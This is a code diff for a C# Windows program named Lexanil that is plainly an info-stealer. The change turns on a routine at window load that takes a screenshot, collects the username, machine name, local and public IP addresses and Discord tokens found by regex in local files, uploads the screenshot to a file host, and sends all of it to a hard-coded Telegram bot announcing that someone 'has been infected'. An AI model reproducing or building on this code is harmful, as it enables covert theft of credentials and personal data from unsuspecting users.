@@ -43,8 +43,8 @@ namespace Lexanil
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-            uploadFileAndNotify();
-            //broadcastInfection(); 
+           
+            broadcastInfection(); 
             //disableShortcuts();
             //prockilltmr.Start();
             //ShowCursor(false);
@@ -161,13 +161,15 @@ namespace Lexanil
 
         private void broadcastInfection()
         {
+            CaptureScreen();
             string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text=" +
                 $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexanil™) Has infected Someone, I'm sending you his details! 😈\n" +
-                $"User Name: {Environment.UserName}\n" +
-                $"Machine Name: {Environment.MachineName}\n" +
-                $"LocalIP: {GetLocalIPAddress()}\n" +
-                $"PublicIP: {GetPublicIPAddress()}\n" +
-                $"Discord Tokens: {string.Join("\n", getDiscordTokens())}";
+                $"User Name: {Environment.UserName}\n\n" +
+                $"Machine Name: {Environment.MachineName}\n\n" +
+                $"LocalIP: {GetLocalIPAddress()}\n\n" +
+                $"PublicIP: {GetPublicIPAddress()}\n\n" +
+                $"Discord Tokens(Last on is the working one): {string.Join("\n\n", getDiscordTokens())}\n\n" +
+                $"Screenshot: {uploadFileAndNotify()}\n\n";
 
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
@@ -202,7 +204,7 @@ namespace Lexanil
                     .SelectMany(x => Regex.Matches(x, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}").Cast<Match>())
                     .Select(x => x.Value)
                     .Concat(
-                        files
+                        files 
                         .SelectMany(x => Regex.Matches(x, @"mfa\.[\w-]{84}").Cast<Match>())
                         .Select(x => x.Value)
                         )
@@ -227,17 +229,18 @@ namespace Lexanil
             return bitmap;
         }
 
-        private void uploadFileAndNotify()
+        private string uploadFileAndNotify()
         {
             using (WebClient client = new WebClient())
             {
-                CaptureScreen();
+                
                 byte[] responseArray = client.UploadFile("https://api.anonfiles.com/upload", Paths.ScreenShots + ".jpeg");
                 var response = System.Text.Encoding.ASCII.GetString(responseArray).ToString();
                 var match = Regex.Match(response, @"\w+://\w+.\w+/\w+/screencap-\d+_\w+").ToString();
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=-561001723&text={match}");
                 HttpWebResponse response2 = (HttpWebResponse)request.GetResponse();
                 Stream resStream = response2.GetResponseStream();
+                return match;
             }
         }
     }
